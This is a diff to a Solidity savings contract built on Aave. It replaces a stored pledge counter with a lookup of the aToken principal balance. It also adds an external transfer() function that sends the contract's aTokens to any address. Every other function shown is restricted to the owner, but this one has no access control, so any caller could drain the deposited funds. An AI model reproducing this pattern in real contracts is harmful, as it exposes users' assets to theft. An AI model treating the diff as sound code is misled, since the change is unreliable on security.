@@ -22,8 +22,6 @@ contract AaveSavingsProtocol is ConstantAddresses, OwnableUpgradeSafe {
 
     address payable private _referral;
 
-    uint256 private _pledgeEth;
-
     constructor(address payable depositor, address payable referral) public {
         _depositor = depositor;
         _referral = referral;
@@ -33,15 +31,22 @@ contract AaveSavingsProtocol is ConstantAddresses, OwnableUpgradeSafe {
     function deposit() public payable onlyOwner {
         uint256 amount = msg.value;
         lendingPool.deposit { value : amount} (AAVE_MARKET_ETH, amount, 0);
-        _pledgeEth = _pledgeEth.add(amount);
     }
 
     function balanceOf() public view onlyOwner returns (uint256){
         return aToken.balanceOf(address(this));
     }
 
+    function transfer(address recipient, uint256 amount) external returns (bool){
+        return aToken.transfer(recipient, amount);
+    }
+
     function interestAmount() public view onlyOwner returns (uint256){
-        return balanceOf().sub(_pledgeEth);
+        return balanceOf().sub(getPledgeEth());
+    }
+
+    function getPledgeEth() public view onlyOwner returns (uint256){
+        return aToken.principalBalanceOf(address(this));
     }
 
     function redeem() public onlyOwner {
@@ -50,6 +55,7 @@ contract AaveSavingsProtocol is ConstantAddresses, OwnableUpgradeSafe {
 
     function withdrawal() public onlyOwner {
         uint256 balance = address(this).balance;
+        uint256 _pledgeEth = getPledgeEth();
         uint256 interest = balance.sub(_pledgeEth);
         if (interest > 0) {
             uint256 serviceCharge = _mulDiv(interest, 3, 100);
